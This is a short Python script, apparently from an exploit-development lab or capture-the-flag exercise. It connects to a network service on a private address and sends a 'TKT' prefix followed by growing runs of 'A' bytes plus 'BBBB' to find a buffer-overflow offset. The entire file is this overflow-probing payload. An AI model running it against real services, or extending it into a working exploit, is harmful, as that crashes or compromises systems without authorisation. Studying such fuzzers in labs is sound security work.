#!/usr/bin/env python3

import socket
import sys

HOST = "192.168.197.56"
PORT = 20025

def fuzzer():
    for offset in range(60,91,1):
        print(f"Trying offset: {offset}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((HOST, PORT))
            
            welcome = s.recv(1024)
            print(f"Received: {welcome.decode().strip()}")
            
            payload = b"TKT" + b"A" * offset + b"B" * 4
            s.send(payload)
            
            try:
                response = s.recv(1024)
                print(f"Response: {response.decode().strip()}")
            except:
                print("No response")
            
            s.close()
            
        except socket.timeout:
            print("Timeout")
            break
        except ConnectionRefusedError:
            print("Connection refused")
            break
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    if len(sys.argv) > 1:
        HOST = sys.argv[1]
    if len(sys.argv) > 2:
        PORT = int(sys.argv[2])
    
    fuzzer()

